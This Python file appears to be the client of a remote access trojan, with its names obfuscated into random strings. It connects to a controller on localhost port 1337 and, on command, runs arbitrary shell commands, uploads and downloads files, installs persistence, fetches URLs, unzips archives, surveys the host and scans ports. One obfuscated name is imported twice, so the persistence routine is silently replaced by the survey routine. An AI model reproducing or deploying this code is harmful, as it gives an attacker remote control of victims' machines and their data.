#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import PCIXrYBHgUfcWimMNwcVTszRyHYsbXNo, OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ, HbXGxUiFGAGASkxUVivHmrjONjMwQoxq
    from core.filesock import ZtWixuDXDhaMQOEglQBRYVZQGcktUJMs, WFREbbdnIuOOJMStvqQujEfaBoFJDwWU
    from core.persistence import WSqSOAnShQHSvdedPYYsODeGEBJMNifM
    from core.scan import XIYCETtbzJrGxUAdNDRxrQdvVWmOeGVH
    from core.survey import WSqSOAnShQHSvdedPYYsODeGEBJMNifM
    from core.toolkit import fTBqkQoEyLkFGuxuVbMlcrBDwpWkCbRo, rfHmOENFcCMGJVUDkfWYqGIOFiiQeppp
except ImportError as BFNKxxPCmlZXGlUoSHjrycpHKQwcazuB:
    print(BFNKxxPCmlZXGlUoSHjrycpHKQwcazuB)
    sys.exit(0)
DYaNPqIbIdmUaNyEtEXXPzckhDAzYLNR = sys.platform
bcLFBdCHRExkATQutcfWjvDnUgrXNgMN      = 'localhost'
twYUaDcQtLneyIvLoqRMdxUOUpgxbUGO      = 1337
qhlZbMakHYoIfSIKgjbsaHcwGErViPHC    = 'b14ce95fa4c33ac2803782d18341869f'
def rgcgUomIlWRhOPHtjLlQXjGPvmRZupqZ():
    vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr = socket.socket()
    vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.connect((bcLFBdCHRExkATQutcfWjvDnUgrXNgMN, twYUaDcQtLneyIvLoqRMdxUOUpgxbUGO))
    fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle = HbXGxUiFGAGASkxUVivHmrjONjMwQoxq(vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr)
    while True:
        ICfEIlWulVhjqfwucAwOXoTZKLrvfPbt = vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.recv(1024)
        ICfEIlWulVhjqfwucAwOXoTZKLrvfPbt = PCIXrYBHgUfcWimMNwcVTszRyHYsbXNo(ICfEIlWulVhjqfwucAwOXoTZKLrvfPbt, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle)
        fSgGPfNZXyxlXbPZFUlNngKytImwGcJA, _, action = ICfEIlWulVhjqfwucAwOXoTZKLrvfPbt.partition(' ')
        if fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'quit':
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.close()
            sys.exit(0)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'run':
            DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV.stdout.read() + DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV.stderr.read()
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.sendall(OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ(DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle))
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'download':
            for ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd in action.split():
                ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd = ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd.strip()
                WFREbbdnIuOOJMStvqQujEfaBoFJDwWU(vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr, ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'upload':
            for ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd in action.split():
                ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd = ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd.strip()
                ZtWixuDXDhaMQOEglQBRYVZQGcktUJMs(vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr, ZPPOkbsCooupiQaFoXrvjbpkCzeUCtcd, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'rekey':
            fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle = HbXGxUiFGAGASkxUVivHmrjONjMwQoxq(vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr)
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'persistence':
            DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = WSqSOAnShQHSvdedPYYsODeGEBJMNifM(DYaNPqIbIdmUaNyEtEXXPzckhDAzYLNR)
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.send(OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ(DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle))
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'wget':
            DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = fTBqkQoEyLkFGuxuVbMlcrBDwpWkCbRo(action)
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.send(OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ(DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle))
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'unzip':
            DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = rfHmOENFcCMGJVUDkfWYqGIOFiiQeppp(action)
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.send(OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ(DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle))
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'survey':
            DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = WSqSOAnShQHSvdedPYYsODeGEBJMNifM(DYaNPqIbIdmUaNyEtEXXPzckhDAzYLNR)
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.send(OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ(DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle))
        elif fSgGPfNZXyxlXbPZFUlNngKytImwGcJA == 'scan':
            DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV = XIYCETtbzJrGxUAdNDRxrQdvVWmOeGVH(action)
            vKjYJEdVkGFOUvjlozKKzKIFWxfRvDKr.send(OKSupbNTJNKeVNXuKbkkfKZkGSEpfkGZ(DzYFBDdCfiXirVJbkHLmYJxeDpctoWTV, fPhJrgPAUbiHPqGWKEgQlEqYOOjFYTle))
if __name__ == '__main__':
    rgcgUomIlWRhOPHtjLlQXjGPvmRZupqZ()
